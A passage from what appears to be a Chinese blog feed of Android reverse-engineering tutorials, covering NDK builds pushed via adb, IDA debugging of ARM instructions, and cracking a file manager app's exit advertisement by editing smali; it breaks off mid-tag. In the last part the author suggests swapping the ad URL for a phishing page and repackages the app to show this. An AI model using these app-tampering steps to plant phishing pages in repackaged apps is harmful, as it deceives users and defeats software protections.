my-dir):获取JNI文件路径每个mk必须以 local开始，my-dir是由 Build System提供的，返回的是一个包含mk文件的路径，要获取相应的文件目录路径去调用JNI属性2、include $(CLEAR_VARS) :CLEAR VARS变量也是由 Build System提供，指定清理 LOCAL_开头的文件，但不会清理 LOCAL_PATH开头的3、LOCAL_MODULE := a001:定义的模块名称，如果这里编译岀so文件前面+lib后面+so4、LOCAL_SRC_FILES := a001.c:表示同文件目录下c文件5、LOCAL_ARM MODE：=arm:编译后的指令集，arm每个指令有四个字节6、include $(BUILD_HARED_LIBRARY):把文件构建成可执行程序如果是动态链接库就用：include(shared library)如果是静态链接库：include $(static library)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、编写application-mk代码"><a href="#3、编写application-mk代码" class="headerlink" title="3、编写application.mk代码"></a>3、编写application.mk代码</h3><pre class="line-numbers language-none"><code class="language-none">APP_ABI := x86 armeabi-v7a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里说明一下</p><p><code>v7a</code>是可以兼容<code>armeabi</code>的，一般就加上就好</p><p><code>v7a</code>的意思是第7代及以上的ARM处理器，目前大部分都支持，为了性能优化，都会写上!</p><p>x86是可以兼容<code>armeabi</code>的</p><p>那么在不设计到平台情况下，只需要改<code>MODULE</code>和<code>SRC_FILES</code>即可!</p><h3 id="4、进行编译"><a href="#4、进行编译" class="headerlink" title="4、进行编译"></a>4、进行编译</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659162.png" alt="image-20210812135357852"></p><p>放在jni目录下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659163.png" alt="image-20210812135425897"></p><p>编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659164.png" alt="image-20210812135312788"></p><p>可看到生成了两个文件：<code>libs</code>、<code>obj</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659165.png" alt="image-20210812135455392"></p><p><code>armeabi-v7a</code>和<code>x86</code>下面的文件是ELF文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659166.png" alt="image-20210812135512350"></p><p>都是linux下的文件</p><p>注：PIE安全机制从4.1引入</p><p>但是 Android L之前的系统版本并不会去检验可执行文件是否基于PIE编译岀的。因此不会报错。</p><p>但是 Android L已经开启验证，如果调用的可执行文件不是基于PIE方式编译的，则无法运行。</p><p>所以需要在<code>Android.mk</code>中加入flag</p><pre class="line-numbers language-none"><code class="language-none">LOCAL_CFLAGS += -pie -fPIELOCAL_LDFLAGS += -pie -fPIE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="5、进行adb-push上传"><a href="#5、进行adb-push上传" class="headerlink" title="5、进行adb push上传"></a>5、进行adb push上传</h2><pre class="line-numbers language-none"><code class="language-none">adb push C:\Users\Administrator\Desktop\libs\armeabi-v7a\aaa data/local/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659167.png" alt="image-20210812135851654"></p><p>加权</p><pre class="line-numbers language-none"><code class="language-none">chmod +x <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108121659168.png" alt="image-20210812140013359"></p><p><strong>请注意：这里使用的技术仅用于学习知识目的，如果列出的技术用于其他任何目标，我概不负责。</strong></p><p>OK！就到这里</p><p><a href="https://www.freebuf.com/articles/articles/mobile/280471.html">安卓学习(一)</a></p><p><a href="https://www.freebuf.com/articles/articles/mobile/281426.html">安卓学习思路方法总结（二）</a></p><p><a href="https://www.freebuf.com/articles/mobile/282950.html">安卓学习思路方法总结（三）</a></p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(五) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(八)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-ba/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-ba/</url>
      
        <content type="html"><![CDATA[<p>我们继续</p><h2 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545785.png" alt="image-20210830012805240"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545787.png" alt="image-20210830012812273"></p><h2 id="条件码表"><a href="#条件码表" class="headerlink" title="条件码表"></a>条件码表</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545788.png" alt="image-20210830012920554"></p><h2 id="三级流水线"><a href="#三级流水线" class="headerlink" title="三级流水线"></a>三级流水线</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545789.png" alt="image-20210830013054315"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="连接真机"><a href="#连接真机" class="headerlink" title="连接真机"></a>连接真机</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545790.png" alt="image-20210830104202329"></p><p>上传IDA中的android_server</p><p>我之前上传过了 就不上传了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545791.png" alt="image-20210830104407667"></p><h3 id="切换root权限"><a href="#切换root权限" class="headerlink" title="切换root权限"></a>切换root权限</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545792.png" alt="image-20210830111442020"></p><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545793.png" alt="image-20210830111504988"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545794.png" alt="image-20210830111519365"></p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><pre class="line-numbers language-none"><code class="language-none">adb forward tcp:23946 tcp:23946<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545795.png" alt="image-20210830104441311"></p><p>安装APK到安卓机上</p><p>这次使用的是install</p><p>之前安装过了 就不搞了</p><pre class="line-numbers language-none"><code class="language-none">adb install C:\javandk1.apk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="打开ddms"><a href="#打开ddms" class="headerlink" title="打开ddms"></a>打开ddms</h3><p>挂起程序</p><pre class="line-numbers language-none"><code class="language-none">adb shell am start -D -n com.example.javandk1/.MainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545796.png" alt="image-20210830110441741"></p><p>ddms查看</p><p>变红色的了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545797.png" alt="image-20210830110413817"></p><h3 id="IDA-Debugger连接"><a href="#IDA-Debugger连接" class="headerlink" title="IDA Debugger连接"></a>IDA Debugger连接</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545798.png" alt="image-20210830104540423"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545799.png" alt="image-20210830104558268"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545800.png" alt="image-20210830111609246"></p><p>搜索我们的android程序 双击进入即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545801.png" alt="image-20210830111658309"></p><p>熟悉的页面 就来了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545802.png" alt="image-20210830111724988"></p><h3 id="增加设置"><a href="#增加设置" class="headerlink" title="增加设置"></a>增加设置</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545803.png" alt="image-20210830120307445"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545804.png" alt="image-20210830120252220"></p><p><strong>F9运行一下</strong> </p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><pre class="line-numbers language-none"><code class="language-none">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8600<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545805.png" alt="image-20210830112104995"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545806.png" alt="image-20210830112118266"></p><h3 id="加载so库"><a href="#加载so库" class="headerlink" title="加载so库"></a>加载so库</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545807.png" alt="image-20210830153457345"></p><p>然后运行一下 重新搜索</p><p>出现so库</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545808.png" alt="image-20210830153607505"></p><p>双击进入 即可</p><p>继续搜索 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545809.png" alt="image-20210830153631743"></p><h2 id="IDA窗口了解"><a href="#IDA窗口了解" class="headerlink" title="IDA窗口了解"></a>IDA窗口了解</h2><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545810.png" alt="image-20210830153728349"></p><h3 id="寄存器窗口"><a href="#寄存器窗口" class="headerlink" title="寄存器窗口"></a>寄存器窗口</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545811.png" alt="image-20210830153747909"></p><h3 id="栈顶"><a href="#栈顶" class="headerlink" title="栈顶"></a>栈顶</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545813.png" alt="image-20210830153806770"></p><h3 id="栈底"><a href="#栈底" class="headerlink" title="栈底"></a>栈底</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545814.png" alt="image-20210830153823811"></p><h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><p>一个字节八位，四个字节是32位</p><p>一个十六进制数表示四位，两个十六进制数表示一个字节</p><p>这里的数据都是三十二位的，三十二位系统意思是可以处理2的32次方就是4G内存！</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545815.png" alt="image-20210830153838876"></p><h3 id="关闭的窗口"><a href="#关闭的窗口" class="headerlink" title="关闭的窗口"></a>关闭的窗口</h3><p>在这里打开</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545816.png" alt="image-20210830114946527"></p><h2 id="ndk动态调试实操"><a href="#ndk动态调试实操" class="headerlink" title="ndk动态调试实操"></a>ndk动态调试实操</h2><h3 id="下断点"><a href="#下断点" class="headerlink" title="下断点"></a>下断点</h3><p>下断点</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545817.png" alt="image-20210914214844992"></p><p>Yes即可</p><p>PC就是往下走</p><p>分析每一条指令</p><h3 id="第一条指令解析"><a href="#第一条指令解析" class="headerlink" title="第一条指令解析"></a>第一条指令解析</h3><p>第一条指令是LDR指令</p><p>R0:F54BC000，R3:00000001</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545818.png" alt="image-20210914214947196"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545819.png" alt="image-20210914215011048"></p><p>小箭头进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545820.png" alt="image-20210914215137139"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545821.png" alt="image-20210914215222330"></p><p>ESC返回</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545822.png" alt="image-20210914215315408"></p><p>F7单步步入</p><h3 id="第二条指令解析"><a href="#第二条指令解析" class="headerlink" title="第二条指令解析"></a>第二条指令解析</h3><p>R2的值变成 <code>00000004</code> 进行了覆盖写入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545823.png" alt="image-20210914215445035"></p><p>F7单步步入</p><h3 id="第三条指令解析"><a href="#第三条指令解析" class="headerlink" title="第三条指令解析"></a>第三条指令解析</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545824.png" alt="image-20210914215542040"></p><p>STR是栈顶指针 将寄存器的数据存储到存储器 </p><p>SP 的值是<code>FFEE2B60</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545825.png" alt="image-20210914215806773"></p><p>点击箭头进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545826.png" alt="image-20210914215715164"></p><p>内存里从右往左读就是小端，左往右读就是大端</p><p>小端存放</p><p>在前面 可以看到var_4 是被定义的<code>-4</code>的意思</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545827.png" alt="image-20210914215854094"></p><p>是把LR的值给SP</p><p>继续单步步入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545828.png" alt="image-20210914215952043"></p><p>之前的栈顶是<code>FFEE2B60</code></p><p>现在的栈顶是<code>FFEE2B5C</code></p><p>60是十六进制的计算=6×16+0=96</p><p>然后在通过var_4就是-4=92</p><p>然后92在/16=5余12</p><p>商为5对应十六进制5</p><p>余数12对应十六进制C</p><p>所以这里就是<code>FFEE2B60</code>转换为<code>FFEE2B5C</code></p><p>查看hex dump</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545829.png" alt="image-20210914220330384"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545830.png" alt="image-20210914220519324"></p><p>从右往左存储</p><h3 id="第四条指令解析"><a href="#第四条指令解析" class="headerlink" title="第四条指令解析"></a>第四条指令解析</h3><p>可看到第四条指令中，SP的值是<code>FFEE2B5C</code>，EC指向栈顶值<code>F5240BA9</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545831.png" alt="image-20210914220648121"></p><p>SUB 是减</p><p>SP减去0C，C是12</p><p>SP=5C=5×16+12-12=48/16=5余0-&gt;50</p><p>继续F7步入</p><p>栈顶 就变成了50</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545832.png" alt="image-20210914220902809"></p><h3 id="第五条指令解析"><a href="#第五条指令解析" class="headerlink" title="第五条指令解析"></a>第五条指令解析</h3><p>R1:<code>00000000</code></p><p>SP:<code>FFEE2B50</code></p><p>R2:<code>00000004</code></p><p>ADD是加的意思</p><p>R1=SP+R2=5×16+0+0×16+4=84/16=5余4-&gt;54</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545833.png" alt="image-20210914221001842"></p><p>继续步入</p><p>可以看到R1变成34(FFEE2B54)</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545834.png" alt="image-20210914221153686"></p><h3 id="第六条指令解析"><a href="#第六条指令解析" class="headerlink" title="第六条指令解析"></a>第六条指令解析</h3><p>R3:<code>F5433D20</code></p><p>LDR</p><p>把右边中括号里面的值，放到R3中</p><p>中括号里面的值=R3+0×18=2×16+0+18=50/16=3余2-&gt;32</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545835.png" alt="image-20210914221248068"></p><p>小箭头查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545836.png" alt="image-20210914221517194"></p><p>20的值是：<code>F50F0111</code> 一样还是倒着看两位</p><p>没有就补0</p><p>继续步入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545837.png" alt="image-20210914221949127"></p><h3 id="第七条指令解析"><a href="#第七条指令解析" class="headerlink" title="第七条指令解析"></a>第七条指令解析</h3><p>R2：<code>00000004</code></p><p>MOVT指令</p><p>这里的T是高16位，进行进1</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545838.png" alt="image-20210914222043694"></p><p>单步F7步入查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545839.png" alt="image-20210914222201657"></p><h3 id="第八条指令解析"><a href="#第八条指令解析" class="headerlink" title="第八条指令解析"></a>第八条指令解析</h3><p>R3：<code>F50F0111</code></p><p>BLX，B是跳转，L是link链接，Ⅹ是状态</p><pre class="line-numbers language-none"><code class="language-none">BLX:LR和T,PC会变BL:LR和PC会变BX:T和PC会变<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>理解一下：就是带链接又带状态的跳转！带链接就是会返回！</p><p>会跳到下一条指令的地址：F42B4058</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545840.png" alt="image-20210914222239948"></p><p>F7单步步入观察T标志位：</p><p>请注意：这里我卡死了 重启了一下IDA 所以栈地址发生了改变。。</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545841.png" alt="image-20210916145854292"></p><p>点击小箭头进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545842.png" alt="image-20210916145915728"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545843.png" alt="image-20210916145951176"></p><p>ESC返回</p><p>往下看 最后 它是走到了这里</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545844.png" alt="image-20210916150138337"></p><p>F4 选中</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545845.png" alt="image-20210916150223736"></p><p>F7 单步步入 进行返回</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545846.png" alt="image-20210916150304579"></p><p>成功返回</p><p>注：要想跳转分析指令 </p><p>只需要重新在此处下断点，然后F9进去即可</p><h2 id="静态so库分析"><a href="#静态so库分析" class="headerlink" title="静态so库分析"></a>静态so库分析</h2><p>直接把so文件拖入IDA即可</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545847.png" alt="image-20210916151450724"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545848.png" alt="image-20210916151517005"></p><h3 id="Test2分析"><a href="#Test2分析" class="headerlink" title="Test2分析"></a>Test2分析</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545849.png" alt="image-20210916152804089"></p><p>注：流程图和文本图 空格切换</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545850.png" alt="image-20210916152821033"></p><h4 id="第一条指令解析-1"><a href="#第一条指令解析-1" class="headerlink" title="第一条指令解析"></a>第一条指令解析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545851.png" alt="image-20210916152835496"></p><p>就是将[括号内的RO的值取出放入R12中</p><h4 id="第二条指令解析-1"><a href="#第二条指令解析-1" class="headerlink" title="第二条指令解析"></a>第二条指令解析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545853.png" alt="image-20210916152851356"></p><p>将R3~R5,LR入栈,满递减堆栈</p><p>满减递归</p><p>STMFD这个放在后面还会详解</p><h4 id="第三、四条指令解析"><a href="#第三、四条指令解析" class="headerlink" title="第三、四条指令解析"></a>第三、四条指令解析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545854.png" alt="image-20210916152905406"></p><p>MOV把R0的值给R4</p><p>然后直接把<code>(aAge-0×1288)</code>的偏移值给R2</p><p>双击<code>aAge</code>进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545855.png" alt="image-20210916152918661"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545856.png" alt="image-20210916152557392"></p><p>这里自定义的成员变量</p><p>aAge表示这个<code>00002C34</code>地址</p><p>就是<code>00002C34</code>这个地址-0x1288数据产生的偏移值</p><p>然后把这个偏移值放入R2</p><p>ESC 返回</p><h4 id="第五、六条指令解析"><a href="#第五、六条指令解析" class="headerlink" title="第五、六条指令解析"></a>第五、六条指令解析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545857.png" alt="image-20210916153002199"></p><p>和上面很像</p><p>MOV把R1的值给R5</p><p>然后直接把<code>(aLjavaLangStrin - 0×128C</code>的偏移值给R3</p><p>双击<code>aLjavaLangStrin</code>进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545858.png" alt="image-20210916153205000"></p><p>aLjavaLangStrin表示这个<code>00002C20</code>地址</p><p>就是<code>00002C20</code>这个地址·-0×128C·数据产生的偏移值</p><p>然后把这个偏移值放入R3</p><p>ESC 返回</p><h4 id="第七、八条指令解析"><a href="#第七、八条指令解析" class="headerlink" title="第七、八条指令解析"></a>第七、八条指令解析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545859.png" alt="image-20210916153402443"></p><p>ADD加，PC当前要执行的地址 +R2里面的值 的和 放入R2</p><p>这时候地址里面的数据就是<code>age </code></p><p>PC当前要执行的地址 +R2里面的值 的和 放入R3</p><p>这时候地址里面的数据就是<code>Ljava/lang/String</code></p><p>注：后面动态调试 还会继续说明</p><h4 id="第九-十五指令解析"><a href="#第九-十五指令解析" class="headerlink" title="第九~十五指令解析"></a>第九~十五指令解析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545860.png" alt="image-20210916153631476"></p><pre class="line-numbers language-none"><code class="language-none">1、BLX执行后,R2存放的地址是下一跳的地址值，0000128C，这里T:0-&gt;12、R4的值取出放入R33、MOV把R5的值给R1赋值4、把[R3，#0×24]地址里面的数据放入R3寄存器5、MOV把R0的值给R2赋值6、一样是BLX7、MOV把R0的值给R4赋值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="第十六-十八指令解析"><a href="#第十六-十八指令解析" class="headerlink" title="第十六~十八指令解析"></a>第十六~十八指令解析</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202109161545861.png" alt="image-20210916153737216"></p><pre class="line-numbers language-none"><code class="language-none">1、BL:不带状态只有B带上X才表示即将执行的指令会发生一个指令集的变化即ARM变成tumb或者是thumb变成ARM那么这里只是BL不带X，所以T是不会变动的，就是单纯的把地址放入LR2、MOV把R0的值给R2赋值3、LDMED和 STMFD是对应存在的，会在后面的动态调试进行解释<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OK 这次就到这里</p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(八) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(四)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-si/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-si/</url>
      
        <content type="html"><![CDATA[<p>我们继续</p><h2 id="实操四：RE文件管理器"><a href="#实操四：RE文件管理器" class="headerlink" title="实操四：RE文件管理器"></a>实操四：RE文件管理器</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>进行安装</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031647925.png" alt="image-20210802134423313"></p><p>然后我们打开</p><p>可以看到文件权限</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031648012.png" alt="image-20210802134513173"></p><p>当我们点击退出之后 它会弹出广告</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031648387.png" alt="image-20210802134821022"></p><p>然后当我们 点击一个广告之后</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653614.png" alt="image-20210802134859955"></p><p>它会把这应用添加到后台进行下载</p><p>那么我们的目标就是去掉APK退出时 加载的广告</p><p>首先开始adb进行抓这个APP的包</p><pre class="line-numbers language-none"><code class="language-none">adb shell dumpsys activity top<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后发现这个类</p><pre class="line-numbers language-none"><code class="language-none">com.AddDouDouWall2.WebPageDownLoadMainActivity 676828b pid=2506<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653622.png" alt="image-20210802135553335"></p><h3 id="jadx-gui分析"><a href="#jadx-gui分析" class="headerlink" title="jadx-gui分析"></a>jadx-gui分析</h3><p>将APK丢到<code>jadx-gui</code>中进行分析</p><p>进行反编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653623.png" alt="image-20210802135331824"></p><p>进行搜索</p><pre class="line-numbers language-none"><code class="language-none">WebPageDownLoadMainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653624.png" alt="image-20210802135749904"></p><p>点击进来  进行查看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653625.png" alt="image-20210802135842479"></p><p>一些按钮 true 和 flase</p><p>然后 有一个地址</p><p>我们进行访问看一下</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653626.png" alt="image-20210802162320896"></p><p>发现 它就是我们退出时候的那个广告页面 </p><p>那么 这里 是不是可以放上我们的钓鱼页面呢</p><p>继续 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653627.png" alt="image-20210802142400816"></p><pre class="line-numbers language-none"><code class="language-none">addContentView(this.webView, params);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>增加了一个addContentView把这些 webview，params传进去然后</p><pre class="line-numbers language-none"><code class="language-none">startService(new Intent(this, DownLoadManagerService.class));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最重要的一点还是这<code>startService</code>，我们看看逻辑</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653628.png" alt="image-20210802142721017"></p><p>可以看到<code>DownLoadManagerService</code>去继承了一个Service类，</p><p>那么我们不让它去继承 是不是就破解了</p><p>继续</p><p>查找用例</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653629.png" alt="image-20210802144037140"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653630.png" alt="image-20210802144126412"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653632.png" alt="image-20210802144154118"></p><pre class="line-numbers language-none"><code class="language-none">public void onDestroy() { Intent iii; w a2; if (isNetworkAvailable(this)) {  startActivity(new Intent(this, WebPageDownLoadMainActivity.class));}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看这个onDestroy</p><p>isNetworkAvailable查询当前一个网络状况</p><p>如果有网络就<code>startActivity</code></p><p>继续</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653633.png" alt="image-20210802144609214"></p><h3 id="Android-Killer分析"><a href="#Android-Killer分析" class="headerlink" title="Android Killer分析"></a>Android Killer分析</h3><p>将APK丢进来</p><p>首先搜索</p><pre class="line-numbers language-none"><code class="language-none">WebPageDownLoadMainActivity<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653634.png" alt="image-20210802140923149"></p><p>进入<code>AndroidMainfest.xml</code> 它是APK的配置文件</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653635.png" alt="image-20210802141124572"></p><p>然后搜索这个网址</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653636.png" alt="image-20210802140648390"></p><p>然后我们删掉这个URL  根据第一节 去广告的知识 <a href="https://www.freebuf.com/articles/mobile/280471.html">安卓学习(一)</a></p><p><strong>我们知道 删掉这个页面 它就不会加载了 但是依然会有那个白屏的界面</strong></p><p>那么我们如果放上自己的钓鱼页面呢</p><p>拿百度进行举例</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653637.png" alt="image-20210802141717879"></p><p>保存 回编译 <img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653638.png" alt="image-20210802141805474"></p><p>进行查看</p><p>当我们继续退出的时候</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653639.png" alt="image-20210802141940561"></p><p>成功跳转到百度 说明是可以的</p><p>然后继续</p><p>搜索<code>DownLoadManagerService</code> 我们是要找Web层的 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653640.png" alt="image-20210802143619723"></p><p>定位<code>startService</code>这个方法</p><p>v4集合到p0里面 然后就<code> return-void</code>退出了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653641.png" alt="image-20210802143518451"></p><p>然后我们去搜索这个onDestroy方法</p><p>根据package</p><pre class="line-numbers language-none"><code class="language-none">package com.speedsoftware.rootexplorer;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653642.png" alt="image-20210802144919291"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653643.png" alt="image-20210802144951025"></p><p>成功找到</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653644.png" alt="image-20210802145043288"></p><p>进行分析</p><p>找到 onDestroy</p><p>isNetworkAvailable进行一个判断</p><pre class="line-numbers language-none"><code class="language-none">if-eqz v0, :cond_0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后返回一个v0有没有网络，如果v0等于0就跳转到<code>cond_0</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653645.png" alt="image-20210802145416843"></p><p>继续向下执行 就跳转到</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108031653646.png" alt="image-20210802145525856"></p><p>那么我们进行修改就可以了</p><pre 